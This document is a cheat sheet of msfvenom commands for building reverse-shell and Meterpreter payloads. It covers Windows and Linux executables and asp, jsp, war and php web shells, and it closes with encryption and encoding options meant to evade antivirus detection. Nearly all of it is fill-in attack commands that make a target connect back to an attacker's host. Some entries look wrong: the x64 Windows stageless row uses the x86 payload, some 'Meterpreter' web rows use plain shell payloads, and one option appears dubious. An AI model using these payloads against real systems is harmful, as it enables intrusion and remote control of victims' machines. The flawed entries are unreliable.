## Non-Meterpreter Reverse Shells

**Stageless** Payloads for Windows (Works with netcat)

| x86  | `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe` |
| ---- | ------------------------------------------------------------ |
| x64  | `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe` |

**Stageless** Payloads for Linux (Works with netcat)

| x86  | `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` |
| ---- | ------------------------------------------------------------ |
| x64  | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` |

**Staged** Payloads for Windows

| x86  | `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe` |
| ---- | ------------------------------------------------------------ |
| x64  | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe` |

**Staged** Payloads for Linux

| x86  | `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` |
| ---- | ------------------------------------------------------------ |
| x64  | `msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` |

------


## Non-Meterpreter Web Payloads

| asp  | `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp` |
| ---- | ------------------------------------------------------------ |
| jsp  | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp` |
| war  | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war` |
| php  | `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php` |

------

## Meterpreter Binaries


**Staged** Payloads for Windows

| x86  | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe` |
| ---- | ------------------------------------------------------------ |
| x64  | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe` |

**Staged** Payloads for Linux

| x86  | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` |
| ---- | ------------------------------------------------------------ |
| x64  | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` |

**Stageless** Payloads for Linux

| x86  | `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` |
| ---- | ------------------------------------------------------------ |
| x64  | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` |

**Stageless** Payloads for Windows

| x86  | `msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe` |
| ---- | ------------------------------------------------------------ |
| x64  | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe` |



------

## Meterpreter Web Payloads

| asp  | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp` |
| ---- | ------------------------------------------------------------ |
| jsp  | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp` |
| war  | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war` |
| php  | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php` |

----

## Payload Encryption and Customization

### Payload Encryption

To obfuscate the payload and evade (some) antivirus detection, you can use payload encryption.

**Example: Encrypting a payload**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe --encrypt xor --encrypt-key <KEY> > encrypted_shell.exe
```

Replace <KEY> with a custom key for XOR encryption.



### Payload Customization

Use various obfuscation techniques to make your payload less detectable by security tools.

**Example - Obfuscating a payload with Shikata Ga Nai**

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -e x86/shikata_ga_nai > obfuscated_shell.exe
```



Consider adjusting payload properties to fit specific scenarios. For example, changing the sleep time to delay beacon intervals.

**Example -Modifying sleep time for a Windows reverse shell**

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe --platform windows --arch x86 --smallest --encrypt xor --encrypt-key <KEY> --sleep 10 > custom_shell.exe
```

Replace `<KEY>` with a custom key and adjust the sleep time as needed.

